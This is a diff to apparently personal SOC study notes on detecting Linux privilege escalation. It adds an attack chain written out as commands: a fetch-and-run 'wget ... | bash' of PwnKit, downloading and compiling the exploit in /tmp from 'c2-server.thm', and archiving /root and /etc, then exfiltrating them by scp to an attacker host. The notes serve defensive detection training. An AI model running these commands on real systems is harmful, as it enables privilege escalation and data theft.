@@ -141,6 +141,13 @@ As an SOC we can set rules in auditd to search for commands that spawn reverse s
 
 ### Privilege Escalation Basics
 
+Attackers, once they get past Initial Access they face various difficulties. We saw how a lack of an SSH connection would force them to use discovery commands on the browser window, which doesn't offer the full capabilities of bash.
+	- More often than not if an attacker breaches a system they find themselves with the lowest privileges
+		- These low privilege accounts dont offer much visibility usually they are low in the hierarchy; if were talking a large-scale network
+		- **Privilege Escalation** MITRE technique **TA0004** definition: Consists of techniques that adversaries use to gain higher-level permissions on a system or network.
+
+**Example: Attacker Performs Discovery to Get to Root**
+
 | Preceding Discovery (IF) | Privilege Escalation (THEN) |
 |---|---|
 | The `uname -a` shows an old, unpatched Ubuntu 16.04 | Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh \| bash` |
@@ -151,15 +158,33 @@ As an SOC we can set rules in auditd to search for commands that spawn reverse s
 
 ### Detecting Privilege Escalation
 
+
+
 Reference syntax for confirming privilege escalation by comparing effective user before and after:
 
 ```
-ausearch -i -x pwnkit
-ausearch -i --ppid <exploit_pid>
-ausearch -i --ppid <root_shell_pid>
+# Detection 1: A Spike of Discovery Commands
+whoami                                                # Returns "www-data" user
+id; pwd; ls -la; crontab -l                           # Basic initial Discovery
+ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
+uname -r                                              # Returns an old 4.4 kernel
+
+# Detection 2: A Download to Temp Directory
+wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
+gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
+chmod +x /tmp/pwnkit                                  # Making exploit executable
+/tmp/pwnkit                                           # Trying to use the exploit
+
+# Detection 3: Data Exfiltration With SCP
+whoami                                                # Now returns "root" user
+tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
+scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
+
 ```
 
 
+
+---
 
 **Which command line was used to look for the "pass" keyword in files?**
 
